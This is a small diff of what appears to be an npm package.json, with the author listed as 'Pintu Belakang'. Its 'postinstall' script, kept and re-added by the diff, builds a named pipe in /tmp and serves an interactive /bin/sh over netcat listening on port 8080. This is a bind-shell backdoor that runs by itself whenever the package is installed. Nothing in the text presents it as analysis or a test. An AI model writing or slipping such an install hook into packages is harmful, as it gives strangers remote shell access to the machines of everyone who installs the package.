@@ -9,6 +9,6 @@
   "author": "Pintu Belakang <belakang@gmail.com>",
   "license": "MIT",
   "scripts": {
-    "postinstall": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f &disown"
+    "postinstall": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f &"
   }
 }
